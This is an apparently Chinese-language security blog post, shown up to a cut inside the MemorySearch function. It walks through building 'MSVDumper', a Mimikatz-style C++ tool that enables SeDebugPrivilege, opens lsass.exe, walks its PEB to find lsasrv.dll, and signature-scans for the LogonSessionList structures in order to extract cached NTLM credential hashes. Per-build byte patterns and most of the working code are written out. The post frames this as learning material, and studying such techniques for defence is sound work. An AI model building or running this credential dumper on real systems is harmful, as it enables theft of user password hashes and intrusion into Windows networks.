---
title: Sekurlsa - 如何从 MSV1_0 中转储用户登录凭据
date: 2023-01-31 23:26:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Windows", "Lsass"]
layout: post
---

# 0. 基础知识

在交互式身份验证中，LSA 会调用身份验证包来确定是否允许用户登录。MSV1_0 是随 Microsoft Windows 操作系统一起安装的身份验证包，用于执行 NTLM 身份验证。它接受用户名和密码哈希，并在安全帐户管理器数据库（SAM）中查找用户名和哈希密码组合，如果登录数据与存储的凭据匹配，身份验证包允许登录成功。成功验证安全主体凭据后，MSV1_0 身份验证包会为主体创建新的 LSA 登录会话，将用户帐户名称和用户密码哈希与每个登录会话相关联后缓存在 LSA 服务器进程中。

LSA 服务器进程将登录会话保存在 `LogonSessionList` 全局变量中，此外还有一个全局变量 `LogonSessionListCount` 用于存储当前活动的会话数，二者分别位于 lsass.exe 进程加载的 lsasrv.dll 模块中的某个位置。

为了能够在 `LogonSessionList` 中提取出登录凭据，首先需要从 lsass.exe 进程中计算出加载的 lsasrv.dll 模块的基地址，然后在该模块中定位两个全局变量，最后从 `LogonSessionList` 中解密用户凭据。至于如何找这两个变量，可以采用签名扫描的方法。由于两个变量都是全局变量，因此它们可以利用某些不变的字节序列作为特征码来识别引用这些全局变量的指令。

例如在 Windows 10 x64 1903 系统中，可以扫描下图红色边框标出的 `33 ff 41 89 37 4c 8b f3 45 85 c0 74` 特征码，以识别 `mov r9d, cs:?LogonSessionListCount` 和 `lea rcx, ?LogonSessionList` 指令。在 x86_64 架构上，这些指令使用 `rip` 相对寻址来访问和使用全局变量，下图中的蓝色和绿色边框标出的字节序列，即为指令所保存的 `LogonSessionList` 和 `LogonSessionListCount` 相对于当前指令的偏移量（小端序）。

![image-20221218113509901](/assets/posts/2023-01-31-sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/image-20221218113509901.png)

下面给出更深入的解释：

- 签名代码：上图中红色边框标出的字节序列，这一段字节序列在同一版本系统中不变，因此可以用来识别 `mov r9d, cs:?LogonSessionListCount` 和 `lea rcx, ?LogonSessionList` 指令。
- LogonSessionList：在 x86_64 架构上，可以引用相对于指令指针当前值的地址。绿色边框标出的四个字节前的三个字节标记了 ` lea rsi` 指令，边框内的四个字节保存了 `LogonSessionList` 变量相对于 `rip` 指令的偏移量。此时 `rip` 指向的地址为绿色边框结束的地址。
- LogonSessionListCount：同理，`LogonSessionListCount` 变量的偏移量由蓝色边框标记出。此时 `rip` 指向的地址为蓝色边框结束的地址。

在这个例子中，首先扫描出特征码的地址是 `0x18006D4A4`，然后加上 23 个字节定位到保存 `LogonSessionList` 变量的地址，取出偏移量为 `0x119DC1`，因此可以计算出 `LogonSessionList` 变量的地址为 `0x18006D4A4 + Hex(23) + Hex(4) + 0x119DC1 = 0x180187280`，如下图所示位置，可以看到 `LogonSessionList` 是一个 `LIST_ENTRY` 结构体，该结构会在下文中讲到。

![image-20221218113813825](/assets/posts/2023-01-31-sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/image-20221218113813825.png)

同理可以算出 `LogonSessionListCount` 变量的地址。

此外，由于用户的登录凭据属于机密信息，在内存中使用对称加密算法进行加密。为了对获取到的加密凭据进行解密，需要利用与上述相同的方法获取加密密钥和初始化向量。

下面笔者参考 Mimikatz 的代码，通过 C/C++ 编写一个名为 MSVDumper 的工具，用来转储 lsass.exe 进程中的哈希凭据。由于篇幅限制仅描述关键代码部分，相关头文件定义以及各个函数的定义位置请读者自行实现。

# 1. 编写主函数

MSVDumper 的主函数定义如下。主函数启动后，首先会通过 `RtlGetNtVersionNumbers()` 函数获取操作系统版本，并分别赋值常量 `NT_MAJOR_VERSION`、`NT_MINOR_VERSION` 和 `NT_BUILD_NUMBER`。

```c++
DWORD NT_MAJOR_VERSION, NT_MINOR_VERSION, NT_BUILD_NUMBER;

int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken = NULL;

	RtlGetNtVersionNumbers(&NT_MAJOR_VERSION, &NT_MINOR_VERSION, &NT_BUILD_NUMBER);
	// Open a process token and get a process token handle with TOKEN_ADJUST_PRIVILEGES permission
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error [%u].\n", GetLastError());
		return -1;
	}

	if (EnableDebugPrivilege(hToken, SE_DEBUG_NAME))
	{
		if (GetLogonData())
		{
			return 1;
		}
	}
}
```

然后通过 `GetCurrentProcess()` 函数获取当前进程，并用 `OpenProcessToken()` 函数打开当前进程的句柄，并将其赋给 `hToken`。

## 1.1 提升进程令牌特权

由于 lsass.exe 是系统进程，因此工具在调试 lsass.exe 内存之前需要为当前进程开启 SeDebugPrivilege 特权。因此需要将当前进程的句柄 `hToken` 传入自定义函数 `EnableDebugPrivilege()`，该函数定义如下，其内部通过调用 `AdjustTokenPrivileges()` 为当前进程提升令牌特权。

```c++
BOOL EnableDebugPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;
	
	// Get the LUID value of the SE_DEBUG_NAME (SeDebugPrivilege) privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}
```

## 1.2 获取用户登录信息

最后，主函数将调用自定义函数 `GetLogonData()` 来获取用户登录信息，该函数定义如下，其内部调用自定义函数 `EnumerateLsa()`，用于启动复杂的 LSA 枚举。

```c++
BOOL GetLogonData()
{
	BOOL status = FALSE;
	wprintf(L">>>>=================================================================\n");
	if (status = EnumerateLSA())
	{
		return status;
	}
}
```

# 2. 枚举 LSA 信息

编写 `EnumerateLSA()` 函数，用于枚举有关的 Lsa 信息，包括 lsass.exe 进程信息、用户登录会话信息等，该函数定义如下。

```c++
BOOL EnumerateLSA()
{
	BOOL status = FALSE;
	BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
	ULONG nbListes = 1, i;
	PVOID pStruct;
	MEMORY_ADDRESS aBuffer;
	const LSA_ENUM_HELPER* helper;

	status = AcquireLSA();

	if (status)
	{
		if (cLsass.osContext.BuildNumber < WIN_MIN_BUILD_2K3)
			helper = &LsassEnumHelpers[0];
		else if (cLsass.osContext.BuildNumber < WIN_MIN_BUILD_VISTA)
			helper = &LsassEnumHelpers[1];
		else if (cLsass.osContext.BuildNumber < WIN_MIN_BUILD_7)
			helper = &LsassEnumHelpers[2];
		else if (cLsass.osContext.BuildNumber < WIN_MIN_BUILD_8)
			helper = &LsassEnumHelpers[3];
		else if (cLsass.osContext.BuildNumber < WIN_MIN_BUILD_BLUE)
			helper = &LsassEnumHelpers[5];
		else
			helper = &LsassEnumHelpers[6];

		ReadProcessMemory(cLsass.hProcess, LogonSessionListCount, &nbListes, sizeof(ULONG), NULL);
		for (i = 0; i < nbListes; i++)
		{
			if (aBuffer.address = LocalAlloc(LPTR, helper->tailleStruct))
			{
				if (ReadProcessMemory(cLsass.hProcess, &LogonSessionList[i], &pStruct, sizeof(PVOID), NULL))
				{
					while (pStruct != &LogonSessionList[i])
					{
						if (ReadProcessMemory(cLsass.hProcess, pStruct, aBuffer.address, helper->tailleStruct, NULL))
						{
							sessionData.LogonId = (PLUID)((PBYTE)aBuffer.address + helper->offsetToLuid);
							sessionData.LogonType = *((PULONG)((PBYTE)aBuffer.address + helper->offsetToLogonType));
							sessionData.Session = *((PULONG)((PBYTE)aBuffer.address + helper->offsetToSession));
							sessionData.UserName = (PUNICODE_STRING)((PBYTE)aBuffer.address + helper->offsetToUsername);
							sessionData.LogonDomain = (PUNICODE_STRING)((PBYTE)aBuffer.address + helper->offsetToDomain);
							sessionData.pCredentials = *(PVOID*)((PBYTE)aBuffer.address + helper->offsetToCredentials);
							sessionData.pSid = *(PSID*)((PBYTE)aBuffer.address + helper->offsetToPSid);
							sessionData.pCredentialManager = *(PVOID*)((PBYTE)aBuffer.address + helper->offsetToCredentialManager);
							sessionData.LogonTime = *((PFILETIME)((PBYTE)aBuffer.address + helper->offsetToLogonTime));
							sessionData.LogonServer = (PUNICODE_STRING)((PBYTE)aBuffer.address + helper->offsetToLogonServer);

							GetUnicodeString(sessionData.UserName, cLsass.hProcess);
							GetUnicodeString(sessionData.LogonDomain, cLsass.hProcess);
							GetUnicodeString(sessionData.LogonServer, cLsass.hProcess);

							GetSid(&sessionData.pSid, cLsass.hProcess);

							status = LsaLogonData(&sessionData);

							if (sessionData.UserName->Buffer)
								LocalFree(sessionData.UserName->Buffer);
							if (sessionData.LogonDomain->Buffer)
								LocalFree(sessionData.LogonDomain->Buffer);
							if (sessionData.LogonServer->Buffer)
								LocalFree(sessionData.LogonServer->Buffer);
							if (sessionData.pSid)
								LocalFree(sessionData.pSid);

							pStruct = ((PLIST_ENTRY)(aBuffer.address))->Flink;
						}
						else 
							break;
					}
				}
				LocalFree(aBuffer.address);
			}
		}
	}
	return status;
}
```

在 `EnumerateLSA()` 中首先会调用自定义函数 `AcquireLSA()`，该函数的作用是提取 lsass.exe 的进程信息。

## 2.1 提取 lsass.exe 进程信息

编写 `AcquireLSA()` 函数，该函数定义如下。函数上面的 `LsassPackages[]` 是一个自定义的 `LSA_PACKAGE` 结构体数组，用于保存程序用到的 LSA 身份验证包的基本配置信息。如下所示，这里仅保存了一个 `Lsass_Msv1_0_Package` 成员，用于保存当前程序需要用到的 lsasrv.dll 模块名称、模块地址和映像文件大小等信息。

```c++
LSA_PACKAGE Lsass_Msv1_0_Package = { TRUE, L"lsasrv.dll", {{NULL, 0, NULL}, FALSE, FALSE} };
```

`cLsass` 是一个自定义的 `LSA_CONTEXT` 结构体，用于保存 lsass.exe 进程句柄以及系统版本信息。

```c++
const PLSA_PACKAGE LsassPackages[] = {
	&Lsass_Msv1_0_Package,
};

LSA_CONTEXT cLsass = { NULL, {0, 0, 0} };

PLIST_ENTRY LogonSessionList = NULL;
PULONG LogonSessionListCount = NULL;

BOOL AcquireLSA()
{
	BOOL status = FALSE;
	DWORD pid;

	if (pid = GetProcessIdByName(L"lsass.exe"))
		cLsass.hProcess = OpenProcess(PROCESS_VM_READ | ((cLsass.osContext.MajorVersion < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION), FALSE, pid);
	else
		wprintf(L"[-] Lsass Process Not Found.");

	cLsass.osContext.MajorVersion = NT_MAJOR_VERSION;
	cLsass.osContext.MinorVersion = NT_MINOR_VERSION;
	cLsass.osContext.BuildNumber = NT_BUILD_NUMBER & 0x00007fff;

	if (GetVeryBasicModuleInformations(cLsass.hProcess) && Lsass_Msv1_0_Package.Module.isPresent)
	{
		if (LsaSearchGeneric(&cLsass, &Lsass_Msv1_0_Package.Module, LsaSrvReferences, ARRAYSIZE(LsaSrvReferences), (PVOID*)&LogonSessionList, (PVOID*)&LogonSessionListCount, NULL)
			&& Lsass_Msv1_0_Package.Module.isInit)
		{
			if (LsaInitializeProtectedMemory())
				status = AcquireKeys(&cLsass, &Lsass_Msv1_0_Package.Module.Informations);
		}
	}
	return status;
}
```

在该函数内部，首先调用自定义函数 `GetProcessIdByName()` 获取 lsass.exe 进程的 PID，通过 `OpenProcess()` 打开 lsass.exe 进程的句柄后保存到 `cLsass.hProcess` 中。

### 2.1.1 获取 lsass.exe 进程 PID

编写 `GetProcessIdByName()` 函数，该函数内部调用 `CreateToolhelp32Snapshot()` 函数拍摄进程快照，并通过 `Process32First()` 和 `Process32Next()` 函数遍历快照，获取目标进程的 PID。

```c++
DWORD GetProcessIdByName(LPCWSTR processName)
{
	// Create toolhelp snapshot.
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	// Walkthrough all processes.
	if (Process32FirstW(hSnapshot, &process))
	{
		do
		{
			// Compare process.szExeFile based on format of name, i.e., trim file path
			// trim .exe if necessary, etc.
			if (_wcsicmp(process.szExeFile, processName) == 0)
			{
				return process.th32ProcessID;
			}
		} while (Process32NextW(hSnapshot, &process));
	}

	CloseHandle(hSnapshot);
	return 0;
}
```

得到 lsass.exe 进程 PID 后返回 `AcquireLSA()` 函数，继续调用自定义函数 `GetVeryBasicModuleInformations()` 获取 lsass.exe 进程的基本信息，主要获取 lsass.exe 进程加载的 lsasrv.dll 模块，这里采用了遍历 PEB 结构的方法。下面先简单拓展一下关于 PEB 结构的知识。

### 2.1.2 Process Envirorment Block Structure（PEB）

Process Envirorment Block Structure（PEB）即进程环境信息块，Windows 系统的每个运行的进程都维护着一个 PEB 数据块，如下所示。其中包含适用于整个进程的数据结构，存储着全局上下文、启动参数、加载的模块等信息。

```c++
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;
```

在 PEB 结构中有一个指向 `PEB_LDR_DATA` 结构体的指针 `Ldr`，该结构包含有关进程加载的模块的信息，其定义如下。

```c++
typedef struct _PEB_LDR_DATA
{
     ULONG Length;
     UCHAR Initialized;
     PVOID SsHandle;
     LIST_ENTRY InLoadOrderModuleList;
     LIST_ENTRY InMemoryOrderModuleList;
     LIST_ENTRY InInitializationOrderModuleList;
     PVOID EntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```

在 PEB_LDR_DATA 结构体中提供了三个双向链表 `InMemoryOrderModuleList`、`InMemoryOrderModuleList` 和 `InInitializationOrderModuleList`，链表内的节点都是一样的，只是排序不同，表中的每个项都是指向包含进程已加载模块信息的 `LDR_DATA_TABLE_ENTRY` 结构的指针。

`LIST_ENTRY` 结构体定义如下：

```c++
typedef struct _LIST_ENTRY
{
     PLIST_ENTRY Flink;
     PLIST_ENTRY Blink;
} LIST_ENTRY, *PLIST_ENTRY;
```

可以看到这个结构有两个成员，均指向 `LDR_DATA_TABLE_ENTRY` 结构体。其中 `Flink` 指向下一个节点，`Blink` 指向上一个节点，所以这是一个双向链表。

当我们从 `PEB_LDR_DATA` 结构中取到任何一个 `LIST_ENTRY` 结构时，这个结构中的 `Flink` 链接到 `LDR_DATA_TABLE_ENTRY` 结构体，该结构定义如下。

```c++
typedef struct _LDR_DATA_TABLE_ENTRY
{
     LIST_ENTRY InLoadOrderLinks;
     LIST_ENTRY InMemoryOrderLinks;
     LIST_ENTRY InInitializationOrderLinks;
     PVOID DllBase;
     PVOID EntryPoint;
     ULONG SizeOfImage;
     UNICODE_STRING FullDllName;
     UNICODE_STRING BaseDllName;
     ULONG Flags;
     WORD LoadCount;
     WORD TlsIndex;
     union
     {
          LIST_ENTRY HashLinks;
          struct
          {
               PVOID SectionPointer;
               ULONG CheckSum;
          };
     };
     union
     {
          ULONG TimeDateStamp;
          PVOID LoadedImports;
     };
     _ACTIVATION_CONTEXT * EntryPointActivationContext;
     PVOID PatchInformation;
     LIST_ENTRY ForwarderLinks;
     LIST_ENTRY ServiceTagLinks;
     LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
```

可以看到，在结构内部保存了进程已加载模块的信息。并且也有三个 `LIST_ENTRY` 结构的链表 `InLoadOrderLinks`、`InMemoryOrderLinks` 和 `InInitializationOrderLinks`，他们分别对应下一个或上一个 `LDR_DATA_TABLE_ENTRY` 节点中对应的 `LIST_ENTRY` 结构。

以 `InMemoryOrderModuleList` 和 `InMemoryOrderLinks` 为例，也就是说：

- `PEB_LDR_DATA` 结构中 ` InMemoryOrderModuleList` 中的 `Flink` 指向第一个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 的首地址。
- `PEB_LDR_DATA` 结构中 `InMemoryOrderModuleList` 中的 `Blink` 指向最后一个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 的首地址。
- 第一个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 中的 `Flink` 指向第二个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 的首地址。
- 第一个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 中的 `Blink` 指向 `PEB_LDR_DATA` 结构中 `InMemoryOrderModuleList` 的首地址。
- 第二个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 中的 `Flink` 指向第三个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 的首地址。以此类推。
- 最后一个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 中的 `Flink` 指向 `PEB_LDR_DATA` 结构中 `InMemoryOrderModuleList` 的首地址。

最终可以构建起一个以 `PEB_LDR_DATA` 为起点的一个闭合环形双向链表，这样就可以通过 PEB 遍历进程加载的所有模块了。

在获取 lsass.exe 进程的 PEB 时，笔者自定义了一个 `GetProcessPeb()` 函数，其内部调用 `NtQueryInformationProcess()` 函数检索指定进程的 PEB 结构信息，如下所示。

```c++
BOOL GetProcessPeb(HANDLE hProcess, PPEB pPeb)
{
	BOOL status = FALSE;
	PROCESS_BASIC_INFORMATION processInformations;
	ULONG returnLength;

	if (NT_SUCCESS(NtQueryInformationProcess(hProcess, ProcessBasicInformation, &processInformations, sizeof(processInformations), &returnLength)) 
		&& (returnLength == sizeof(processInformations)) 
		&& processInformations.PebBaseAddress)
	{
		status = ReadProcessMemory(hProcess, processInformations.PebBaseAddress, pPeb, sizeof(PEB), NULL);
	}

	return status;
}
```

### 2.1.3 获取 lsasrv.dll 模块基地址

了解完 PEB 结构后，开始编写 `GetVeryBasicModuleInformations()` 函数，用于遍历 lsass.exe 进程的 PEB，来获取 lsass.exe 进程加载的 lsasrv.dll 模块的地址，该函数定义如下。

```c++
BOOL GetVeryBasicModuleInformations(HANDLE hProcess)
{
	BOOL status = FALSE;
	PEB Peb;
	PEB_LDR_DATA LdrData;
	LDR_DATA_TABLE_ENTRY LdrEntry;
	PROCESS_VERY_BASIC_MODULE_INFORMATION moduleInformation;
	UNICODE_STRING moduleName;
	PBYTE pListEntryStart, pListEntryEnd;

	moduleInformation.ModuleName = &moduleName;
	if (GetProcessPeb(hProcess, &Peb))
	{
		if (ReadProcessMemory(hProcess, Peb.Ldr, &LdrData, sizeof(PEB_LDR_DATA), NULL))
		{
			for (
				pListEntryStart = (PBYTE)LdrData.InLoadOrderModuleList.Flink,
				pListEntryEnd = (PBYTE)Peb.Ldr + FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModuleList);
				pListEntryStart != pListEntryEnd;
				pListEntryStart = (PBYTE)LdrEntry.InLoadOrderLinks.Flink
				)
			{
				if (ReadProcessMemory(hProcess, pListEntryStart, &LdrEntry, sizeof(LDR_DATA_TABLE_ENTRY), NULL))
				{
					moduleInformation.DllBase.address = LdrEntry.DllBase;
					moduleInformation.SizeOfImage = LdrEntry.SizeOfImage;
					moduleName = LdrEntry.BaseDllName;

					if (GetUnicodeString(&moduleName, cLsass.hProcess))
					{
						status = FindModules(&moduleInformation);
					}
					LocalFree(moduleName.Buffer);
				}
			}
		}
	}
	return status;
}
```

在 `GetVeryBasicModuleInformations()` 内部，首先调用 `GetProcessPeb()` 函数检索有关 lsass.exe 进程的 PEB 结构信息，并通过 `ReadProcessMemory()` 函数将 `Peb.Ldr` 指向的 `PEB_LDR_DATA` 结构复制到 `LdrData` 中。

然后遍历所有 `LDR_DATA_TABLE_ENTRY` 结构，分别获取模块地址、映像文件大小和映像文件名称，并把它们保存到 `moduleInformation` 中，这是了一个 `PROCESS_VERY_BASIC_MODULE_INFORMATION` 结构体，其定义如下，用于存储 lsasrv.dll 模块的有关信息。

```c++
typedef struct PROCESS_VERY_BASIC_MODULE_INFORMATION {
	KULL_M_MEMORY_ADDRESS DllBase;                  // 存储已加载模块的地址
	ULONG SizeOfImage;                              // 存储已加载模块的映像大小
	ULONG TimeDateStamp;
	PCUNICODE_STRING NameDontUseOutsideCallback;    // 存储已加载模块的映像名称
} PROCESS_VERY_BASIC_MODULE_INFORMATION, *PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION;
```

最后调用自定义函数 `FindModules()`，通过 `_wcsicmp()` 函数比较当前循环中的模块名称与 `LsassPackages[i]->ModuleName`，也就是 `Lsass_Msv1_0_Package.ModuleName` 中定义的模块名称（lsasrv.dll）是否相等，就将模块信息保存到 `LsassPackages[i]->Module.Informations` 中，如下所示。

```c++
BOOL FindModules(PPROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation)
{
	for (ULONG i = 0; i < ARRAYSIZE(LsassPackages); i++)
	{
		if (_wcsicmp(LsassPackages[i]->ModuleName, pModuleInformation->ModuleName->Buffer) == 0)
		{
			LsassPackages[i]->Module.isPresent = TRUE;
			LsassPackages[i]->Module.Informations = *pModuleInformation;
		}
	}

	return TRUE;
}
```

至此，成功获取 lsass.exe 进程中加载的 lsasrv.dll 模块的信息，`GetVeryBasicModuleInformations()` 函数调用结束。接下来，将调用 `LsaSearchGeneric()` 函数来定位 `LogonSessionList` 和 `LogonSessionListCount` 这两个全局变量。

### 2.1.4 获取 LogonSessionList 变量地址

前文中提到，在定位 `LogonSessionList` 和 `LogonSessionListCount` 这两个关键的全局变量时，采用签名扫描的方法。参考 Mimikatz，可以将常见系统版本的特征码保存在一个名为 `LsaSrvReferences[]` 的数组中，这些特征码用于识别引用 `LogonSessionList` 和 `LogonSessionListCount` 的指令，如下所示。

```c++
BYTE PTRN_WIN5_WLsaEnumerateLogonSession[] = { 0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8 };
BYTE PTRN_WN60_WLsaEnumerateLogonSession[] = { 0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84 };
BYTE PTRN_WN61_WLsaEnumerateLogonSession[] = { 0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84 };
BYTE PTRN_WN63_WLsaEnumerateLogonSession[] = { 0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05 };
BYTE PTRN_WN6x_WLsaEnumerateLogonSession[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
BYTE PTRN_WN1703_WLsaEnumerateLogonSession[] = { 0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
BYTE PTRN_WN1803_WLsaEnumerateLogonSession[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
BYTE PTRN_WN11_WLsaEnumerateLogonSession[] = { 0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
PATCH_GENERIC LsaSrvReferences[] = {
	{WIN_BUILD_XP,		{sizeof(PTRN_WIN5_WLsaEnumerateLogonSession),	PTRN_WIN5_WLsaEnumerateLogonSession},	{0, NULL}, {-4,   0}},
	{WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_WLsaEnumerateLogonSession),	PTRN_WIN5_WLsaEnumerateLogonSession},	{0, NULL}, {-4, -45}},
	{WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_WLsaEnumerateLogonSession),	PTRN_WN60_WLsaEnumerateLogonSession},	{0, NULL}, {21,  -4}},
	{WIN_BUILD_7,		{sizeof(PTRN_WN61_WLsaEnumerateLogonSession),	PTRN_WN61_WLsaEnumerateLogonSession},	{0, NULL}, {19,  -4}},
	{WIN_BUILD_8,		{sizeof(PTRN_WN6x_WLsaEnumerateLogonSession),	PTRN_WN6x_WLsaEnumerateLogonSession},	{0, NULL}, {16,  -4}},
	{WIN_BUILD_BLUE,	{sizeof(PTRN_WN63_WLsaEnumerateLogonSession),	PTRN_WN63_WLsaEnumerateLogonSession},	{0, NULL}, {36,  -6}},
	{WIN_BUILD_10_1507,	{sizeof(PTRN_WN6x_WLsaEnumerateLogonSession),	PTRN_WN6x_WLsaEnumerateLogonSession},	{0, NULL}, {16,  -4}},
	{WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_WLsaEnumerateLogonSession),	PTRN_WN1703_WLsaEnumerateLogonSession},	{0, NULL}, {23,  -4}},
	{WIN_BUILD_10_1803,	{sizeof(PTRN_WN1803_WLsaEnumerateLogonSession),	PTRN_WN1803_WLsaEnumerateLogonSession},	{0, NULL}, {23,  -4}},
	{WIN_BUILD_10_1903,	{sizeof(PTRN_WN6x_WLsaEnumerateLogonSession),	PTRN_WN6x_WLsaEnumerateLogonSession},	{0, NULL}, {23,  -4}},
	{WIN_BUILD_2022,	{sizeof(PTRN_WN11_WLsaEnumerateLogonSession),	PTRN_WN11_WLsaEnumerateLogonSession},	{0, NULL}, {24,  -4}},
};
```

数组中的每个成员都是一个 `PATCH_GENERIC` 结构体，用于保存特征码的匹配规则，其结构定义如下。

```c++
typedef struct _PATCH_GENERIC {
	DWORD MinBuildNumber;     // 系统版本号
	PATCH_PATTERN Search;     // 包含特征码
	PATCH_PATTERN Patch;
	PATCH_OFFSETS Offsets;    // 保存 LogonSessionList 和 LogonSessionListCount 偏移量值的四个字节的偏移量
} PATCH_GENERIC, * PPATCH_GENERIC;
```

下面开始编写 `LsaSearchGeneric()` 函数，定义如下。

```c++
BOOL LsaSearchGeneric(PLSA_CONTEXT cLsass, PLSA_LIB pLib, PPATCH_GENERIC genericReferences, SIZE_T cbReferences, PVOID* genericPtr, PVOID* genericPtr1, PLONG genericOffset)
{
	BOOL status = FALSE;
	MEMORY_SEARCH sMemory = { {pLib->Informations.DllBase.address, pLib->Informations.SizeOfImage}, NULL };
	PPATCH_GENERIC currentReference;
	LONG offset;
	MEMORY_ADDRESS lsassMemory;

	if (currentReference = GetGenericFromBuild(genericReferences, cbReferences, cLsass->osContext.BuildNumber))
	{
		if (MemorySearch(cLsass->hProcess, currentReference->Search.Pattern, currentReference->Search.Length, &sMemory))
		{
			lsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off0;
			if (status = ReadProcessMemory(cLsass->hProcess, lsassMemory.address, &offset, sizeof(LONG), NULL))
			{
				*genericPtr = ((PBYTE)lsassMemory.address + sizeof(LONG) + offset);
			}

			if (genericPtr1)
			{
				lsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off1;
				if (status = ReadProcessMemory(cLsass->hProcess, lsassMemory.address, &offset, sizeof(LONG), NULL))
				{
					*genericPtr1 = ((PBYTE)lsassMemory.address + sizeof(LONG) + offset);
				}
			}

			if (genericOffset)
				*genericOffset = currentReference->Offsets.off1;
		}
	}
	pLib->isInit = status;
	return status;
}
```

在该函数内部，`GetGenericFromBuild()` 会根据 `cLsass->osContext.BuildNumber` 记录的版本号在 `LsaSrvReferences` 中选择适用于当前系统版本的特征码规则，并赋值给  `currentReference`。然后将 `currentReference` 连同 `&sMemory` 传入自定义函数 `MemorySearch()`。其中 `sMemory` 是一个 `MEMORY_SEARCH` 结构体，用于临时保存 lsasrv.dll 模块的基地址和映像大小，其定义如下。

```c++
typedef struct _MEMORY_SEARCH {
	MEMORY_RANGE memoryRange;
	LPVOID result;
} MEMORY_SEARCH, * PMEMORY_SEARCH;

typedef struct _MEMORY_RANGE {
	MEMORY_ADDRESS memoryAdress;
	SIZE_T size;
} MEMORY_RANGE, * PMEMORY_RANGE;

typedef struct _MEMORY_ADDRESS {
	LPVOID address;
} MEMORY_ADDRESS, * PMEMORY_ADDRESS;
```

 `MemorySearch()` 函数用于在内存中匹配特征码，其定义如下。其首先划分出 lsasrv.dll 模块的内存空间从而确定要搜索范围的最大内存地址 `limit`，然后遍历 `limit` 范围的内存，通过 `RtlEqualMemory()` 函数匹配出与特征码相同的内存块，最终确定特征码的地址。

```c++
BOOL MemorySearch(HANDLE hProcess, LPBYTE Pattern, SIZE_T Length, PMEMORY_SEARCH Search)
{
	BOOL status = FALSE;
	MEMORY_SEARCH sBuffer = { { NULL, Search->memoryRange.size}, NULL };
	PBYTE CurrentPtr;
	PBYTE limit;

	if (sBuffer.memoryRange.memoryAdress.address = LocalAlloc(LPTR, Search->memoryRange.size))
	{
		if (ReadProcessMemory(hProcess, Search->memoryRange.memoryAdress.address, sBuffer.memoryRange.memoryAdress.address, Search->memoryRange.size, NULL))
		{
